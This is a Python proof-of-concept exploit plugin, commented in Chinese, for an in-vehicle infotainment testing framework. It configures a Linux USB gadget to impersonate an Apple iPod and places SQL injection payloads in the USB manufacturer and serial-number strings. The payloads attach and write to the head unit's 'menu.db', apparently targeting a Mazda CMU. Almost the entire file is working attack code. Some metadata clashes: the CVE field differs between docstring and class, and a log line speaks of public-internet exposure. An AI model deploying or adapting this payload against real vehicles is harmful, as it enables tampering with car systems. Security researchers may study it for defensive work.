"""
PoC Name: IVI USB Gadget SQL Injection
CVE: CVE-2024-8355
Component: Application Stack
Category: Application
Severity: High
CVSS: 6.8
Description: USB Gadget序列号SQL注入IVI数据库(CMU)
Prerequisites: 必须在支持 USB OTG (如 Raspberry Pi Zero、USB Armory) 并加载了 libcomposite 驱动的 Linux 设备上运行，需 root 权限。
Usage: sudo python3 51_IVI_USB_SQLi.py
"""
import sys
import os
import time
import subprocess
from iv_plugin_base import IVIVulnerabilityPlugin


def _remove_path(path, *, directory=False):
    try:
        if directory:
            os.rmdir(path)
        else:
            os.unlink(path)
    except FileNotFoundError:
        pass
    except OSError:
        pass

class IVIUsbSqliPlugin(IVIVulnerabilityPlugin):
    meta_display_id = "POC-APP-002"
    meta_poc_name = "IVI USB SQLi"
    meta_cve_id = "N/A"
    meta_severity = "High"
    meta_protocol = "unknown"
    meta_target_os = ["all"]
    meta_required_params = []
    is_disruptive = False
    meta_destructive_level = "Safe"

    def check_prerequisites(self):
        if os.geteuid() != 0:
            self.logger.error("此漏洞利用脚本需要配置内核 USB Gadget 层。请使用 root (sudo) 权限执行！")
            return False
            
        if not os.path.isdir("/sys/kernel/config/usb_gadget"):
            self.logger.error("系统不支持 ConfigFS USB Gadget，或者内核未加载 libcomposite 模块。")
            self.logger.warning(">>> 尝试执行 modprobe libcomposite")
            try:
                subprocess.run(["modprobe", "libcomposite"], check=False, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            except OSError:
                pass
            if not os.path.exists("/sys/kernel/config/usb_gadget"):
                return False
                
        return True

    def exploit(self):
        self.logger.info("准备将当前设备转换为恶意 USB Gadget 设备...")
        gadget_name = "malicious_ipod"
        base_path = f"/sys/kernel/config/usb_gadget/{gadget_name}"
        
        try:
            # 清理旧的遗留 gadget
            if os.path.exists(base_path):
                self.logger.info("清理先前的遗留 Gadget 配置...")
                _remove_path(f"{base_path}/configs/c.1/mass_storage.usb0")
                _remove_path(f"{base_path}/configs/c.1/strings/0x409", directory=True)
                _remove_path(f"{base_path}/configs/c.1", directory=True)
                _remove_path(f"{base_path}/functions/mass_storage.usb0", directory=True)
                _remove_path(f"{base_path}/strings/0x409", directory=True)
                _remove_path(base_path, directory=True)

            self.logger.info("创建全新的 USB Gadget 挂载结构 (ConfigFS)...")
            os.makedirs(base_path, exist_ok=True)
            
            # 设置基本 ID：伪装为 Apple iPod (0x05ac, 0x1209)
            with open(f"{base_path}/idVendor", "w") as f: f.write("0x05ac\\n")
            with open(f"{base_path}/idProduct", "w") as f: f.write("0x1209\\n")
            with open(f"{base_path}/bcdDevice", "w") as f: f.write("0x0100\\n")
            with open(f"{base_path}/bcdUSB", "w") as f: f.write("0x0200\\n")
            
            os.makedirs(f"{base_path}/strings/0x409", exist_ok=True)
            
            self.logger.info("注入 SQLi Paylaod 到 Manufacturer 和 SerialNumber 字段...")
            # IVI SQL Injection Vector - e.g. for Mazda CMU
            sqli_payload = "Apple', 1);ATTACH DATABASE '/mnt/data/menu.db' AS evil;CREATE TABLE evil.pwn(t TEXT);--"
            
            with open(f"{base_path}/strings/0x409/manufacturer", "w") as f: f.write(sqli_payload + "\\n")
            with open(f"{base_path}/strings/0x409/product", "w") as f: f.write("iPod\\n")
            with open(f"{base_path}/strings/0x409/serialnumber", "w") as f: f.write("112233' OR 1=1;--\\n")
            
            os.makedirs(f"{base_path}/configs/c.1/strings/0x409", exist_ok=True)
            with open(f"{base_path}/configs/c.1/strings/0x409/configuration", "w") as f: f.write("Config 1\\n")
            
            os.makedirs(f"{base_path}/functions/mass_storage.usb0", exist_ok=True)
            # Link it
            link_path = f"{base_path}/configs/c.1/mass_storage.usb0"
            if not os.path.exists(link_path):
                os.symlink(f"{base_path}/functions/mass_storage.usb0", link_path)
            
            self.logger.info("激活 USB 控制器端口 (UDC)...")
            try:
                udc_candidates = sorted(os.listdir("/sys/class/udc"))
            except OSError:
                udc_candidates = []
            udc_file = udc_candidates[0] if udc_candidates else ""
            
            if not udc_file:
                self.logger.error("未找到任何支持的外围设备 USB 控制器！当前硬件可能不支持 OTG 功能（如普通 Mac / PC）。")
                return {
                     "status": "error",
                     "details": "Hardware lacks OTG / UDC capability."
                }
                
            with open(f"{base_path}/UDC", "w") as f: f.write(udc_file + "\\n")
            
            self.logger.info(f"[SUCCESS] 恶意设备已激活，通过 {udc_file} 暴露至公网。")
            self.logger.warning("[!] 请将当前测试板(如树莓派 Zero)通过数据线插入目标车机中...")
            
            for i in range(15):
                self.logger.info(f"保持 USB 恶意宣告存活，等待目标系统重挂载... ({i+1}/15)")
                time.sleep(1)
                
            # 清理
            self.logger.info("卸载恶意 USB 设置...")
            with open(f"{base_path}/UDC", "w") as f: f.write("\\n")
            
            return {
                "status": "success",
                "vulnerable": False,
                "details": "恶意 USB Gadget 已就绪，需插入目标车机并观察是否触发 SQL 注入副作用。"
            }

        except Exception as e:
            self.logger.error(f"Execution Error: {str(e)}")
            return {
                "status": "error",
                "details": str(e)
            }

if __name__ == "__main__":
    plugin = IVIUsbSqliPlugin({})
    plugin.run_verify()
